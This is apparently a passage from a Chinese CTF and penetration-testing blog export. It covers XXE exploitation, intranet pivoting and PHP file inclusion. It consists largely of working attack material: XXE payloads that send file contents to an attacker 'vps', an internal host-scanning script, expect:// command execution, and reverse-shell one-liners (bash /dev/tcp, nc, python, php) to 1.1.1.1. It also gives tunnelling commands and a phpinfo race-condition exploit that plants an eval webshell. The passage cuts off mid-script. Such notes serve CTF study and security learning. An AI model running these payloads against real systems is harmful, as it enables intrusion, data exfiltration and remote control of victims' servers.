&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);?&gt;

出网payload
&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;%remote;%int;%send;]&gt;

evil.dtd
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;&gt;

vps上监听对应的端口

先调用了%remote，请求远程服务器上的evil.dtd，类似php的include，然后%int调用%file，%file获取敏感文件后将结果填入到%send，最后调用%send把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有%, 所以将其转成html实体编码
不出网以上都是引入外部服务器的OOB XXE（Out-of-band），虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。
这时候就可以考虑利用本地dtd来进行XXE
linux
&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &#x27;Your DTD code&#x27;&gt;%local_dtd;


windows
&lt;!ENTITY % local_dtd SYSTEM &quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;&lt;!ENTITY % SuperClass &#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;&gt;%local_dtd;

引用内部实体payload
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;send;    &#x27;&gt;    %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;





基于报错的XXE(Error Based XXE)基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。
出网payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;https://vps/evil.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;    %remote;    %error;]&gt;&lt;message&gt;test&lt;/message&gt;

evil.dtd
&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;&gt;%start;



不出网如果可以写文件的话就可以构造本地恶意dtd
不出网payload
&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM &quot;file:///tmp/evil.dtd&quot;&gt;    &lt;!ENTITY % condition &#x27;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&#x27;&gt;    %local_dtd;]&gt;&lt;user&gt;            &lt;username&gt;flag&lt;/username&gt;            &lt;password&gt;root&lt;/password&gt;&lt;/user&gt;

evil.dtd
&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;&lt;!ELEMENT pattern (%condition;)&gt;


探测内网主机与端口利用http协议和网页响应时间来判断主机存活
exp
import requestsimport base64def XXE(ip,string):    try:        xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;        x = requests.post(&#x27;http://192.168.91.134/xml.php&#x27;, data=xml, headers=headers, timeout=5).text        coded_string = x.split(&#x27; &#x27;)[-2]        print(&#x27; [+]&#x27;,ip,&#x27;Successfully Found !!!&#x27;)    except:        print(&#x27; [-]&#x27;,ip,&#x27;Error Not Found !!!&#x27;)        passif __name__ == &#x27;__main__&#x27;:    headers = &#123;&#x27;Content-Type&#x27;:&#x27;application/xml&#x27;&#125;    for i in range(130,150):        ip = &#x27;192.168.91.&#x27; + str(i)        string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27;        XXE(ip,string)


根据返回内容的不同来判断端口是否开启
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe SYSTEM &quot;http://192.168.91.149:80&quot; [&lt;!ELEMENT xxe (#PCDATA) &gt;]&gt;&lt;xxe&gt;666&lt;/xxe&gt;


执行系统命令在安装expect扩展的PHP环境里执行系统命令
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;


编码绕过&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);?&gt;

利用utf-16编码绕过
import requestsurl = &#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;payload = &#x27;&#x27;&#x27;&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;%remote;%int;%send;]&gt;&#x27;&#x27;&#x27;payload = payload.encode(&#x27;utf-16&#x27;)rep = requests.post(url=url, data=payload)print(rep.text)

或者命令转换编码iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml，echo urlencode(file_get_contents(&quot;payload.xml&quot;));读
jar:&#x2F;&#x2F; 文件上传Java环境下还可以利用jar协议上传文件
jar协议语法，jar:&#123;url&#125;!/&#123;entry&#125;，url是文件的路径，entry是想要解压出来的文件
jar 协议处理文件的过程：1：下载 jar&#x2F;zip 文件到临时文件中2：提取出我们指定的文件3：删除临时文件
payload
&lt;!DOCTYPE convert [&lt;!ENTITY  remote SYSTEM &quot;jar:http://ip:port/1.zip!/1.php&quot;&gt;]&gt;&lt;convert&gt;&amp;remote;&lt;/convert&gt;

当1.zip中没有1.php时，java解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于php的phpinfo临时文件包含
本地搭建一个环境测试：
main.java，部署在tomcat上，模拟一个存在xxe漏洞的网页
import org.w3c.dom.Element;import org.w3c.dom.Node;import org.w3c.dom.NodeList;import org.xml.sax.InputSource;import org.w3c.dom.Document;import org.xml.sax.SAXException;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.*;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.parsers.ParserConfigurationException;@WebServlet(&quot;/xxe&quot;)public class main extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException&#123;    &#125;    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException&#123;        String parmeter = request.getParameter(&quot;poc&quot;);        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();        DocumentBuilder db = null;        try &#123;            db = dbf.newDocumentBuilder();        &#125; catch (ParserConfigurationException e) &#123;            throw new RuntimeException(e);        &#125;        StringReader sr = new StringReader(parmeter);        InputSource is = new InputSource(sr);        try &#123;            Document document = db.parse(is);            PrintWriter writer = response.getWriter();            Element element = document.getDocumentElement();            NodeList list = element.getChildNodes();            for (int iloop = 0; iloop &lt; list.getLength(); iloop++) &#123;                Node node = list.item(iloop);                if (node.getNodeType() == Node.ELEMENT_NODE) &#123;                    writer.write(node.getNodeName() + &quot;：&quot;                            + node.getTextContent());                &#125;            &#125;            writer.close();        &#125; catch (SAXException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;


再用python起个http服务，进行监听
xxe-jar.py
import sysimport timeimport threadingimport socketserverfrom urllib.parse import quoteimport http.client as httpclisten_host = &#x27;localhost&#x27;listen_port = 9999jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler):    def handle(self):        http_req = b&#x27;&#x27;        print(&#x27;New connection:&#x27;,self.client_address)        while b&#x27;\r\n\r\n&#x27; not in http_req:            try:                http_req += self.request.recv(4096)                print(&#x27;Client req:\r\n&#x27;,http_req.decode())                jf = open(jar_file, &#x27;rb&#x27;)                contents = jf.read()                headers = (&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;                &#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;)                self.request.sendall(headers.encode(&#x27;ascii&#x27;))                self.request.sendall(contents[:-1])                time.sleep(30)                print(30)                self.request.sendall(contents[-1:])            except Exception as e:                print (&quot;get error at:&quot;+str(e))if __name__ == &#x27;__main__&#x27;:    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)    print (&#x27;waiting for connection...&#x27;)    server_thread = threading.Thread(target=jarserver.serve_forever)    server_thread.daemon = True    server_thread.start()    server_thread.join()


执行python xxe-jar.py evil.zip
evil.zip就是要上传的文件了，不一定要是zip，但是因为jar协议会对文件进行解包操作，如果不上传zip格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次zip格式文件获取路径然后再上传其他文件
访问/xxe，post发payload
获取路径
上传文件
监听情况，30是延时了30秒
至于为什么要延迟，回到jar协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行sleep，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了
netdoc 协议Java中netdoc协议可以替代file协议功能，读文件，同时也可以列目录
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [        &lt;!ELEMENT creds ANY&gt;        &lt;!ENTITY xxe SYSTEM &quot;netdoc:///c:/windows/system.ini&quot;&gt;        ]&gt;&lt;creds&gt;&amp;xxe;&lt;/creds&gt;

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [        &lt;!ELEMENT creds ANY&gt;        &lt;!ENTITY xxe SYSTEM &quot;netdoc:///var/www/html/&quot;&gt;        ]&gt;&lt;creds&gt;&amp;xxe;&lt;/creds&gt;




参考：从XML相关一步一步到XXE漏洞XXE 总结一篇文章带你深入理解漏洞之 XXE 漏洞从几道CTF题学习Blind XXEJava XXE 漏洞java代码审计-xxeXML之DTDxxe漏洞攻击与防御XXE 漏洞总结
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习(代理篇)</title>
    <url>/posts/52375b43/</url>
    <content><![CDATA[本文中使用的代理工具可通过我的脚本一键下载https://github.com/dr0n1/CTF_misc_auto_deploy
反弹shell推荐在本地部署一个reverse-shell-generator，可以很方便的查看命令
以下是几个常用的
bash -i/bin/sh -i &gt;&amp; /dev/tcp/1.1.1.1/8888 0&gt;&amp;1

nc# nc -enc 1.1.1.1 8888 -e /bin/sh# nc -cnc -c /bin/sh 1.1.1.1 8888# nc mkfiform /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 1.1.1.1 8888 &gt;/tmp/f


curlC=&#x27;curl -Ns telnet://1.1.1.1:8888&#x27;; $C &lt;/dev/null 2&gt;&amp;1 | /bin/sh 2&gt;&amp;1 | $C &gt;/dev/null

phpphp -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,8888);exec(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;php -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,8888);system(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;


pythonpython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;1.1.1.1&quot;,8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;

HTTP 隧道常用的也就是一个Neo-reGorg，其他的Tunna pystinger 等用的就比较少了
reGeorghttps://github.com/sensepost/reGeorg

上传 tunnel 文件
连接 WEB 服务器，并在本地建立 socks5 代理

python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp

Neo-reGorghttps://github.com/L-codes/Neo-reGeorg

设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器

python neoreg.py generate -k password


使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理

python3 neoreg.py -k password -p 6666 -u http://xx/tunnel.php


SSH隧道常见参数
-C：压缩传输，提高传输速度-f：表示 SSH 连接成功后，转入后台运行-N：建立静默连接，表示只连接远程主机，不打开远程 shell-g：允许远程主机连接本地用于转发的端口-L：本地端口转发 (L 参数一共接受三个值，分别是 本地端口:目标主机:目标主机端口)-R：远程端口转发 (R 参数也是接受三个值，分别是 远程主机端口:目标主机:目标主机端口)-D：动态转发（SOCKS 代理）-P：指定 SSH 端口


本地转发本地转发的意思是将远程主机的某个端口的数据转发到本地服务器的指定端口
这里假设192.168网段是公网，攻击机可以直连
在攻击机上执行
ssh -CfNg -L 6677:172.16.10.10:8080 root@192.168.100.167#ssh端口非默认可以用 -p 指定

就能将边界服务器上host2的流量转发到本地的6677端口上
访问本地的6677端口就能访问到内网的host2

远程转发假设上图中的host1完全处于内网或者做了策略，使得攻击机访问不了host1了，但是host1可以访问vps(攻击机)，就需要远程转发
在host1上执行
ssh -CfNg -R 6666:172.16.10.11:8090 vps

然后访问vps的6666端口就可以访问到host3了
由于对于 host1 来说，vps 是远程主机，所以这种情况就被称为远程端口绑定

这里有一点需要注意，如果使用的是默认配置，可能导致转发后的进程是127.0.0.1
tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      25278/sshd: root

如果需要是0.0.0.0，则需要修改vps上ssh的配置文件
#/etc/ssh/sshd_configGatewayPorts yes

systemctl restart sshd
动态转发动态端口映射就是建立一个 SSH 加密的 SOCKS 4&#x2F;5 代理通道
在vps上或者host1本身上执行都行
ssh -CfNg -D 0.0.0.0:4455 root@192.168.100.167

然后将执行命令的主机的ip和4455端口做socks5代理

另一种稍微麻烦一点的方式：
先在host1上执行
ssh -qTfnN -D 0.0.0.0:7000 root@localhost

然后转发出去即可
ssh -qTfnN -R 0.0.0.0:6699:0.0.0.0:7000 vps

将vps的6699端口配为socks5代理ip后就可以访问内网的host2和host3了

传输层隧道上面的http隧道，ssh隧道，包括不常用的dns隧道，都属于应用层，下面是一些常用的 端口转发 &amp; 内网代理工具
这些综合工具支持多种协议，这里使用其中的socks协议进行内网的代理
后续工具的命令以此图为参照

Stowawayhttps://github.com/ph4ntonn/Stowaway
admin参数:-l 被动模式下的监听地址[ip]:&lt;port&gt;-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致-c 主动模式下的目标节点地址--socks5-proxy socks5代理服务器地址--socks5-proxyu socks5代理服务器用户名(可选)--socks5-proxyp socks5代理服务器密码(可选)--http-proxy http代理服务器地址--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址--heartbeat 开启心跳包agent参数:-l 被动模式下的监听地址[ip]:&lt;port&gt;-s 节点通信加密密钥-c 主动模式下的目标节点地址--socks5-proxy socks5代理服务器地址--socks5-proxyu socks5代理服务器用户名(可选)--socks5-proxyp socks5代理服务器密码(可选)--http-proxy http代理服务器地址--reconnect 重连时间间隔--rehost 端口复用时复用的IP地址--report 端口复用时复用的端口号--up 上游协议类型,默认为裸TCP流量,可选HTTP/WS--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS--cs 运行平台的shell编码类型，默认为utf-8，可选gbk--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址


单层代理
边界服务器(host1)运行：
./linux_x64_admin -l 7000 -s 123

客户端(host2)运行：
./linux_x64_agent -c host1_ip:7000 -s 123 --reconnect 8

连接成功后在服务器端的交互窗口建立代理
use 0socks 6666


使用host1:6666作为socks代理后就可以进行后续其他操作了


多层代理
边界服务器(host1)运行：
./linux_x64_admin -l 7000 -s 123

外层主机(host2)运行：
./linux_x64_agent -c host1_ip:7000 -s 123 --reconnect 8

建立连接后在控制端运行：
use 0listen12233

相当于在host2上监听2233端口

然后用内层主机(host4)连接外层主机(host2)的2233端口
./linux_x64_agent -c host2:2233 -s 123 --reconnect 8

控制端等待节点加入后建立socks代理，注意需要选择新节点
backuse 1socks 6666



FRPhttps://github.com/fatedier/frp
将 frpc 复制到内网服务所在的机器上。将 frps 复制到拥有公网 IP 地址的机器上，并将它们放在任意目录。
编写配置文件，目前支持的文件格式包括 TOML&#x2F;YAML&#x2F;JSON，旧的 INI 格式仍然支持，但已经不再推荐。使用以下命令启动服务器：./frps -c ./frps.toml使用以下命令启动客户端：./frpc -c ./frpc.toml

单层代理
服务端(host1)监听端口然后启动
# frps.tomlbindPort = 7000

客户端(host2)配置
# frpc.tomlserverAddr = &quot;host1_ip&quot;serverPort = 7000[[proxies]]name = &quot;socks5&quot;type = &quot;tcp&quot;plugin.type = &quot;socks5&quot;remotePort = 6666

用proxifier或proxychains指定host1_ip和6666端口即可
还可以选择使用web控制面板或者添加token

多层代理
服务端(host1)配置
# frps.tomlbindPort = 7000

外层主机(host2)同时当(host1的)客户端和(host4的)服务端
# frpc.toml#端口转发#将本地6666端口转发到服务端的6666端口serverAddr = &quot;host1_ip&quot;serverPort = 7000[[proxies]]name = &quot;portforward&quot;type = &quot;tcp&quot;localIP = &quot;127.0.0.1&quot;localPort = 6666remotePort = 6666


# frps.tomlbindPort = 7001


内层主机(host4)配置文件
# frpc.tomlserverAddr = &quot;host2_ip&quot;serverPort = 7001[[proxies]]name = &quot;socks5&quot;type = &quot;tcp&quot;plugin.type = &quot;socks5&quot;remotePort = 6666


ioxiox 是一个端口转发 &amp; 内网代理工具，功能类似于lcx&#x2F;ew
https://github.com/EddieIvan01/iox
端口转发
# 监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发./iox fwd -l 8888 -l 9999# 监听0.0.0.0:8888，把流量转发到1.1.1.1:9999./iox fwd -l 8888 -r 1.1.1.1:9999# 连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999



单层正向代理
直接在边界服务器(host1)上启动Socks5服务就好了
./iox proxy -l 6666

二层正向代理
外层主机(host2)启动socks服务
./iox proxy -l 5555

边界服务器(host1)监听端口并转发流量
./iox fwd -l 6666 -r host2:5555

多层正向代理
内层主机(host4)启动socks服务
./iox proxy -l 4444

外层主机(host2)监听端口并转发流量
./iox fwd -l 5555 -r host4:4444

边界服务器(host1)监听端口并转发流量
./iox fwd -l 6666 -r host2:5555




一层反向代理
linux攻击机上监听端口并转发
./iox proxy -l 7000 -l 6666


边界主机(host1)将流量转发到攻击机
./iox proxy -r server:7000


二层反向代理
linux攻击机上监听端口并转发
./iox proxy -l 7000 -l 6666


边界主机(host1)监听并将流量转发到攻击机
./iox fwd -l 7001 -r server:7000



外层主机(host2)开启socks代理并转发到host1
./iox proxy -r host1:7001




多层反向代理
linux攻击机上监听端口并转发
./iox proxy -l 7000 -l 6666


边界主机(host1)监听并将流量转发到攻击机
./iox fwd -l 7001 -r server:7000



外层主机(host2)监听并将流量转发到host1
./iox fwd -l 7002 -r host1:7001

内层主机(host4)开启socks代理并转发到host2
./iox proxy -r host2:7002


chiselhttps://github.com/jpillora/chisel
单层代理
在服务端(host1)运行，表示开启7000端口来监听进行反向代理
./chisel server -p 7000 --reverse

客户端(host2)运行，表示连接到服务端(host1)的7000端口，把host1:6666作为socks5代理
./chisel client host1:7000 R:0.0.0.0:6666:socks


多层代理
还是先在服务端(host1)运行，表示开启7000端口来监听
./chisel server -p 7000 --reverse

外层主机(host2)即当客户端也当服务端client的命令表示连接到服务端(host1)的7000端口，并将host4转来的5555的流量再次转到服务端(host1)上的6666端口server的命令表示开启7001端口监听
./chisel client host1:7000 R:0.0.0.0:6666:127.0.0.1:5555./chisel server -p 7001 --reverse

内层主机(host4)运行，连到host2:7001，并将流量转发到host2的5555端口
./chisel client host2:7001 R:0.0.0.0:5555:socks



搭建完毕后可以看到host1控制台有一条这样的信息：server: session#1: tun: proxy#R:6666=&gt;5555: Listening
host2的控制台有一条：server: session#1: tun: proxy#R:5555=&gt;socks: Listening
使用host1:6666端口作为socks代理即可
NPS
nps貌似已经不更新了，存在不少bug，非比赛环境需要谨慎使用，社区中有许多二开版本，可以自行查看


官方版本存在越权漏洞。漏洞原理是利用伪造两个参数auth_key、timestamp来完成越权操作的，修复方式是注释掉auth_crypt_key，并修改auth_key的值为随机值，auth_key记得去掉注释https://github.com/weishen250/npscrack

服务端安装后使用 nps start 启动
然后访问8080端口 账户密码默认为 admin&#x2F;123
选择新建一个客户端

然后把客户端文件传递到外层主机上后执行提供的命令

然后新增socks代理即可

linux下全局代理在windows下可以用proxifier轻松实现进程级的全局代理
但是在linux下会有很多命令或者软件的流量不走proxychains的情况出现
这里可以用clash解决
首先在service mode点击安装，旁边的地球变绿就ok了

然后在profiles的地方编辑配置文件

选中自己配置的选项后就能实现全局代理了，注意用tun mode

包括ping命令等都可以走代理了


参考文章：
Frp内网多层隧道搭建内网隧道穿透内网代理搭建内网渗透测试 &lt;3&gt; 隧道技术【Tips+1】IOX 多层网络正向穿透【Tips+1】IOX 反向穿透四层网段
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>任意文件包含/读取总结</title>
    <url>/posts/a3faee7a/</url>
    <content><![CDATA[常见利用函数include： 找不到被包含的文件时只会产生警告，脚本将继续执行。include_once： 和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。require： 找不到被包含的文件时会产生致命错误，并停止脚本。require_once： 和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。readfile：返回从文件中读入的字节数file_get_contents：把整个文件读入一个字符串中



LFI&#x2F;RFI
所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。

远程文件包含（Remote File Inclusion， RFI）是指包含远程服务器上的文件，需要在php.ini中设置allow_url_include=On
远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。
如果对ip过滤了点可以将ip转为int

伪协议官网伪协议手册
file:&#x2F;&#x2F;协议file://用于访问本地文件系统
使用条件：allow_url_fopen=On/Off、allow_url_include=On/Off


trick: 可以用localhost代替&#x2F;

php:&#x2F;&#x2F;协议php:&#x2F;&#x2F;filter使用条件：allow_url_fopen=On/Off、allow_url_include=On/Off


php:&#x2F;&#x2F;filter绕过死亡die&lt;?phperror_reporting(0);highlight_file(__FILE__);$file = $_GET[&#x27;file&#x27;];$content = $_POST[&#x27;content&#x27;];file_put_contents($file,&quot;&lt;?php die();?&gt;&quot;.$content);?&gt;

使用rot13等转换器进行编码

php:&#x2F;&#x2F;input使用条件：allow_url_fopen=On/Off、allow_url_include=On
enctype=&quot;multipart/form-data&quot;(即文件上传)的时候php://input是无效的。

data:&#x2F;&#x2F;协议使用条件：allow_url_include=On、allow_url_fopen=On
利用data:&#x2F;&#x2F;伪协议进行代码执行的思路原理和php:&#x2F;&#x2F;input是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。
用大白话解释就是说原来include包含的是一个路径，再去读取里面的内容，data:&#x2F;&#x2F;协议就相当于两步转为一步，直接读内容，可以理解为将include转为eval
用法：data://text/plain;base64,
trick：符合rfc2397规范即可

Nginx日志包含利用条件：1：有文件名可控的文件包含点2：有可以访问到的日志路径
linux下日志默认存储位置
/var/log/nginx/access.log/var/log/nginx/error_log

在访问时修改User-Agent头为php代码，成功访问后会在日志中记录下来


然后包含日志?file=../../../../../var/log/nginx/access.log，达到任意代码执行的效果
临时文件包含在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。
同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。
但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。
这个时候就需要用到条件竞争，具体流程如下：
1：发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据2：因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大3：php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接4：所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包5：此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除6：利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell
脚本
#!/usr/bin/python# python2 exp.py your-ip 8080 100import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; 